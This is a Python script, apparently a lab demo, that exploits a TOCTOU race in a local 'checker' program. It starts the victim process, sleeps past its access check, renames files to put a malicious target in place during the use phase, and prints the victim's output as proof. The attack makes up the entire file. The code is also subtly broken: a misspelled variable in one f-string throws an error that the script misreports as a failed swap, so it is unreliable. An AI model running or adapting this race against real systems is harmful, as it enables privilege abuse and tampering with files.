import os
import time
import subprocess
import sys

def attacker_exploit(original_filename, malicious_target, injection_target):
 print("-" * 40)
 print(f"[Attacker] Starting race against {original_filename}...")

 # --- Step 1: Start the Victim process (the checker) ---
 # We use subprocess.Popen to start it and let it run in the background
 victim_process = subprocess.Popen(
  ['./checker', original_filename],
  stdout=subprocess.PIPE,
  stderr=subprocess.STDOUT
 )
 print("[Attacker] Victim process started in the background.")

 # Wait a short time to ensure the victim has passed its initial 'access()' check (TOC)
 time.sleep(0.2)
 print("[Attacker] Waiting for victim's check phase to complete...")

 # --- Step 2: The Race - Swap the File! ---
 try:
  os.rename(original_filename, malicious_target)
  print(f"[Attacker] *** SWAP COMPLETE! Renamed '{orginal_filename}' TO '{malicious_target}' ***")
 except Exception as e:
  print(f"[Attacker] [ERROR] Failed to swap file during race: {e}")

 # Wait for the Victim's Use Phase (TOU) - This is the critical window!
 time.sleep(0.2)
 print("[Attacker] Waiting for victim's use phase...")

 # --- Step 3: Revert and Capture Output ---
 try:
  os.rename(injection_target, original_filename)
  print(f"[Attacker] *** REVERT COMPLETE! Renamed '{injection_target}' BACK TO '{original_filename}' ***")
 except Exception as e:
  print(f"[Attacker] [WARNING] Could not revert file name: {e}")

 # Wait for the victim process to finish its final write operation
 victim_process.wait()

 # Capture and print what the victim actually printed!
 stdout, stderr = victim_process.communicate()
 print("\n" + "="*40)
 print("--- VICTIM PROGRAM OUTPUT (The Proof) ---")
 if stdout:
  print(stdout.decode())
 if stderr:
  print("--- STDERR ---")
  print(stderr.decode())
 print("="*40)

if __name__ == "__main__":
 if len(sys.argv) != 4:
  print("Usage: python attacker_race.py <original_filename> <malicious_target> <injection_target>")
  sys.exit(1)

 ORIGINAL = sys.argv[1]
 MALICIOUS = sys.argv[2]
 INJECTION = sys.argv[3]
 attacker_exploit(ORIGINAL, MALICIOUS, INJECTION)

